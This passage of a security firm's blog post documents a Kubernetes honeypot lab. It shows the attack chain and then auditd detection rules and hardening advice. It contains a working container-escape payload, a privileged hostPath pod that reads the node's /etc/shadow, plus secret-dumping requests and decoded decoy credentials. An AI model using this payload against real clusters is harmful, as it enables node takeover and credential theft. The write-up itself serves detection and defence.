+<p>Because the <code>overprivileged-cicd-role</code> includes <code>get</code> and <code>list</code> on <code>secrets</code>, the attacker queries <code>GET https://10.0.0.1:443/api/v1/namespaces/k8s-honeypot-lab/secrets/prod-payment-gateway-secrets</code> and base64-decodes the secret payload:</p>
+<pre><code>Secret Name: prod-payment-gateway-secrets
+  INTERNAL_K8S_DEPLOY_TOKEN (decoded): eyJhbGciOiJSUzI1NiIsImtpZCI6ImhvbWV5cG90LWRlY295In0.DECOY_PAYLOAD
+  POSTGRES_URI (decoded): postgresql://svc_payments:Pr0d_K8s_Vault_9941!@pg-internal.corp.local:5432/payments
+  STRIPE_LIVE_API_KEY (decoded): sk_live_DECOY_HONEYPOT_51N9xK2L8mP4qR7vT0zW</code></pre>
+
+<h3>Step 4: Escalating from Unprivileged Container to Underlying Node Root</h3>
+<div class="callout key"><b>Why <code>create</code> on <code>pods</code> = Root on the Underlying Node VM</b><p>In Kubernetes, if a ServiceAccount has permission to <strong>create pods</strong> (and no Pod Security Admission policy blocks privileged specs), an attacker inside a restricted, unprivileged container can instruct the Kubernetes Management API to schedule a <em>new</em> pod with <code>"privileged": true</code>, <code>"hostPID": true</code>, and a <code>hostPath</code> volume mounting the underlying node VM's root filesystem (<code>/</code>) into <code>/host</code>!</p></div>
+
+<p>Here is the exact JSON payload our script sent from inside the container (`10.244.0.214`) to the Management API (`https://10.0.0.1:443/api/v1/namespaces/k8s-honeypot-lab/pods`):</p>
+<pre><code>POST https://10.0.0.1:443/api/v1/namespaces/k8s-honeypot-lab/pods HTTP/1.1
+Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
+Content-Type: application/json
+
+{
+  "apiVersion": "v1",
+  "kind": "Pod",
+  "metadata": { "name": "priv-node-escape-poc", "namespace": "k8s-honeypot-lab" },
+  "spec": {
+    "hostPID": true,
+    "containers": [{
+      "name": "escape",
+      "image": "python:3.12-slim",
+      "command": ["/bin/sh", "-c", "head -n 3 /host/etc/shadow &amp;&amp; sleep 10"],
+      "securityContext": { "privileged": true },
+      "volumeMounts": [{ "name": "hostfs", "mountPath": "/host" }]
+    }],
+    "volumes": [{ "name": "hostfs", "hostPath": { "path": "/", "type": "Directory" } }],
+    "restartPolicy": "Never"
+  }
+}</code></pre>
+<p>In our PCAP, we see the container (`10.244.0.214`) open TLSv1.3 connections to the Management API (`10.0.0.1:443`) to submit these exact requests:</p>
+<pre><code>22:13:49.984917 azv9df53270c7e In  IP 10.244.0.214.37236 &gt; 10.0.0.1.443: Flags [S], seq 3171525742, win 64240, length 0
+22:13:49.986626 azv9df53270c7e Out IP 10.0.0.1.443 &gt; 10.244.0.214.37236: Flags [S.], seq 30360145, ack 3171525743, length 0
+22:13:49.986995 azv9df53270c7e In  IP 10.244.0.214.37236 &gt; 10.0.0.1.443: Flags [P.], seq 1:1508, ack 1, length 1507</code></pre>
+<p>Seconds later, <code>priv-node-escape-poc</code> starts on <code>aks-nodepool1-28113931-vmss000000</code> and reads the underlying Azure VM's `/etc/shadow` file:</p>
+<pre><code>root:*LOCK*:14600::::::
+daemon:*:20362:0:99999:7:::
+bin:*:20362:0:99999:7:::</code></pre>
+
+<h2 id="auditd-detections">Part 6: How <code>auditd</code> on the Underlying VM Detects Every Syscall</h2>
+<p>Many engineers assume that what happens inside a container is invisible to the underlying VM. <strong>The opposite is true.</strong> Because Linux containers share the host VM's kernel (`6.8.0-1071-azure`), every process execution (`execve`) and file access (`openat`) inside any container is processed directly by the host kernel's audit subsystem (`kauditd` / `auditd`).</p>
+
+<figure>
+  <img src="screenshots/06-auditd-kernel-detections.png" alt="Terminal output from the underlying AKS node VM showing auditctl rules and /var/log/audit/audit.log entries catching ServiceAccount token reads and /host/etc/shadow access">
+  <figcaption>Figure 6: Live `/var/log/audit/audit.log` telemetry from the underlying Ubuntu 24.04 node (`aks-nodepool1-28113931-vmss000000`) catching both the container's ServiceAccount token read (`key="k8s_sa_token_read"`) and the privileged pod's `/host/etc/shadow` read (`key="host_shadow_access"`).</figcaption>
+</figure>
+
+<h3>1. The `auditd` Rules Loaded on the Underlying Node VM</h3>
+<p>On the underlying AKS node VM (`aks-nodepool1-28113931-vmss000000`), we configured `/etc/audit/rules.d/k8s-honeypot.rules`:</p>
+<pre><code># Watch all kubelet projected pod volumes (catches ServiceAccount token reads across ALL pods)
+-w /var/lib/kubelet/pods -p r -k k8s_sa_token_read
+
+# Watch host Kubernetes node certificates &amp; kubeconfig
+-w /etc/kubernetes -p rwxa -k k8s_node_config
+
+# Watch host /etc/shadow (resolved by kernel inode 2609 on dev 08:01 — even when mounted at /host/etc/shadow!)
+-w /etc/shadow -p rwa -k host_shadow_access
+
+# Log all process executions (execve) and container escape syscalls
+-a always,exit -F arch=b64 -S execve -F key=k8s_container_exec
+-a always,exit -F arch=b64 -S ptrace,mount,umount2,unshare,setns -F key=k8s_container_escape</code></pre>
+
+<h3>2. Dissecting the Exact `audit.log` Events Captured on the Node</h3>
+<h4>Detection A: Catching ServiceAccount Token Theft Inside the Container (`key="k8s_sa_token_read"`)</h4>
+<pre><code>type=EXECVE msg=audit(1793830429.843:8280): argc=2 a0="cat" a1="/var/run/secrets/kubernetes.io/serviceaccount/token"
+type=SYSCALL msg=audit(1793830429.844:8281): arch=c000003e syscall=257 success=yes exit=3 a0=ffffffffffffff9c a1=7ffc2e4faa18 a2=0 a3=0 items=1 ppid=1682135 pid=1682148 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="cat" exe="/usr/bin/cat" subj=? key="k8s_sa_token_read" ARCH=x86_64 SYSCALL=openat AUID="unset" UID="root" GID="root"
+type=PATH msg=audit(1793830429.844:8281): item=0 name="/var/run/secrets/kubernetes.io/serviceaccount/token" inode=4 dev=00:a5 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+
+type=SYSCALL msg=audit(1793830429.972:8283): arch=c000003e syscall=257 success=yes exit=3 a0=ffffffffffffff9c a1=7c41391c0e90 a2=80000 a3=0 items=1 ppid=1682135 pid=1682149 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="python3" exe="/usr/local/bin/python3.12" subj=? key="k8s_sa_token_read" ARCH=x86_64 SYSCALL=openat
+type=PATH msg=audit(1793830429.972:8283): item=0 name="/var/run/secrets/kubernetes.io/serviceaccount/token" inode=4 dev=00:a5 mode=0100644</code></pre>
+<p><strong>Forensic Breakdown:</strong></p>
+<ul>
+<li>Why did `-w /var/lib/kubelet/pods -p r -k k8s_sa_token_read` fire when the container read `/var/run/secrets/kubernetes.io/serviceaccount/token`? Because `kubelet` creates the projected tmpfs volume under `/var/lib/kubelet/pods/&lt;pod-uid&gt;/volumes/kubernetes.io~projected/...` on the host node and bind-mounts it into the container at `/var/run/secrets/kubernetes.io/serviceaccount`!</li>
+<li>`auditd` records both the `cat` binary (`pid=1682148`, `exe="/usr/bin/cat"`) and the `python3` script (`pid=1682149`, `exe="/usr/local/bin/python3.12"`) invoking `syscall=257` (`openat`) on the token (`key="k8s_sa_token_read"`).</li>
+</ul>
+
+<h4>Detection B: Catching the `hostPath` Escape Reading `/host/etc/shadow` (`key="host_shadow_access"`)</h4>
+<pre><code>type=EXECVE msg=audit(1793830431.171:8443): argc=4 a0="head" a1="-n" a2="3" a3="/host/etc/shadow"
+type=SYSCALL msg=audit(1793830431.173:8444): arch=c000003e syscall=257 success=yes exit=3 a0=ffffffffffffff9c a1=7fffffea0a5b a2=0 a3=0 items=1 ppid=1682279 pid=1682291 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="head" exe="/usr/bin/head" subj=? key="host_shadow_access" ARCH=x86_64 SYSCALL=openat AUID="unset" UID="root" GID="root"
+type=PATH msg=audit(1793830431.173:8444): item=0 name="/host/etc/shadow" inode=2609 dev=08:01 mode=0100640 ouid=0 ogid=42 rdev=00:00 nametype=NORMAL OUID="root" OGID="shadow"</code></pre>
+<div class="callout key"><b>Why Inode-Based Kernel Auditing Cannot Be Bypassed by Container Mount Paths</b><p>Look closely at `audit(1793830431.173:8444)`: inside the privileged container, the attacker did not access `/etc/shadow`—they accessed <code>name="/host/etc/shadow"</code>. Yet the host VM's `-w /etc/shadow -p rwa -k host_shadow_access` rule still triggered immediately! Why? Because `auditd` file watches attach to the kernel inode (`inode=2609 dev=08:01`) on the host disk, regardless of where that filesystem is mounted inside a container's mount namespace.</p></div>
+
+<h2 id="hardening-playbook">Part 7: Defensive Playbook — Locking Down Kubernetes &amp; SIEM Rules</h2>
+<p>To prevent and detect this entire attack chain in production Kubernetes environments:</p>
+
+<div class="tw"><table>
+<thead>
+<tr><th>Control Layer</th><th>Hardening Configuration</th><th>What It Stops</th></tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>1. Disable Token Automounting</strong></td>
+<td>Set <code>automountServiceAccountToken: false</code> on all application Pods and ServiceAccounts that do not explicitly communicate with the Kubernetes API.</td>
+<td>Eliminates `/var/run/secrets/kubernetes.io/serviceaccount/token` inside the container, stopping Management API attacks cold even if the app suffers RCE.</td>
+</tr>
+<tr>
+<td><strong>2. Least-Privilege RBAC</strong></td>
+<td>Never grant `create`, `patch`, or `exec` on `pods` or `get`/`list` on `secrets` to application or shared runner ServiceAccounts.</td>
+<td>Prevents stolen tokens from dumping Secrets or spawning privileged pods.</td>
+</tr>
+<tr>
+<td><strong>3. Pod Security Standards (Restricted)</strong></td>
+<td>Enforce label <code>pod-security.kubernetes.io/enforce: restricted</code> on namespaces.</td>
+<td>Blocks creation of `privileged: true`, `hostPID: true`, `hostNetwork: true`, and `hostPath` volumes at the API admission layer.</td>
+</tr>
+<tr>
+<td><strong>4. Kubernetes NetworkPolicy</strong></td>
+<td>Block egress from application pods to `10.0.0.1:443` (Management API) and `169.254.169.254` (Azure IMDS).</td>
+<td>Prevents compromised containers from reaching the Kubernetes API Server over the network even if a token is present.</td>
+</tr>
+<tr>
+<td><strong>5. Node `auditd` + K8s Audit Logs</strong></td>
+<td>Monitor `key="k8s_sa_token_read"` from unexpected binaries (`cat`, `curl`, `sh`) and alert on any `host_shadow_access` where `name!="/etc/shadow"`.</td>
+<td>Provides immediate kernel-level detection of post-exploitation and container escape attempts.</td>
+</tr>
+</tbody>
+</table></div>
+
+<div class="cta">
+  <h3>Want a hands-on Kubernetes security review or SIEM detection workshop?</h3>
+  <p>Global SOC helps Australian engineering and security teams audit AKS/EKS clusters, lock down RBAC and Pod Security Standards, and engineer high-signal kernel and control-plane detections. Based in Glen Waverley, Melbourne.</p>
+  <a href="/#contact">Speak with Yogesh</a>
+  <a href="/cybersecurity/">Explore Cybersecurity Services →</a>
+</div>
+
+<p class="related">Related reading: <a href="/blog/securing-ai-code-generation-enterprise/">Securing AI Code Generation in Enterprise Environments</a> · <a href="/blog/php-cve-honeypot-telemetry/">Building an isolated PHP CVE honeypot: from internet scan to PCAP</a></p>
+
+<div class="author"><div class="av" aria-hidden="true">Y</div><div><b style="color:var(--ink)">Yogesh · Global SOC</b><br>Practical cybersecurity architecture, Kubernetes threat research, and SIEM detection engineering from Glen Waverley, Melbourne, Australia.</div></div>
+</article></main>
+
+<footer><div class="wrap"><span>© 2020–2026 Global SOC Pty Ltd · <a href="https://abr.business.gov.au/ABN/View?abn=46646550094" target="_blank" rel="noopener" style="color:inherit;text-decoration:underline dotted;text-underline-offset:3px">ABN 46 646 550 094</a> · Glen Waverley, Melbourne VIC</span><span><a href="/blog/">Blog</a> · <a href="/cybersecurity/">Cybersecurity</a> · <a href="/privacy.html">Privacy</a> · <a href="/">globalsoc.com.au</a></span></div></footer>
+<script>
+document.querySelectorAll('pre').forEach(p=>{const b=document.createElement('button');b.className='copy';b.textContent='Copy';b.onclick=()=>{const t=p.querySelector('code').innerText;(navigator.clipboard?navigator.clipboard.writeText(t):Promise.reject()).then(()=>{b.textContent='Copied';setTimeout(()=>b.textContent='Copy',1500)}).catch(()=>{b.textContent='Select & copy'})};p.appendChild(b)});
+</script>
+<script src="https://globalsoc.com.au/v.js" defer></script>
+</body>
+</html>
